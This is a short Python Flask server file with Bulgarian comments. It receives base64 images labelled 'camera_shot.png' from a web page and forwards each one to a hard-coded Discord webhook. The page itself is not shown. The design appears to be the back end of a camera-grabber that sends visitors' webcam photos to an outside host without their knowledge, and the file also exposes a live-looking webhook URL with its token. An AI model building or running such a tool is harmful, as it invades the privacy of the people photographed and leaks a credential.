from flask import Flask, render_template, request, jsonify
import base64
import requests

app = Flask(__name__, template_folder='../templates')

# ЗАМЕНИ ТОВА С ТВОЯ DISCORD WEBHOOK URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1485737648415838321/n0sOURJ6Chrtd9zbj7ViJSI_TCBWI4sMGhA-jYSP6GnnWdqbZ4NQ7LMvR84R_4LseREE"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/upload', methods=['POST'])
def upload():
    try:
        data = request.json['image']
        # Декодираме Base64 снимката
        image_bytes = base64.b64decode(data.split(",")[1])
        
        # Пращаме към Discord
        files = {'file': ('camera_shot.png', image_bytes, 'image/png')}
        requests.post(DISCORD_WEBHOOK, files=files)
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400
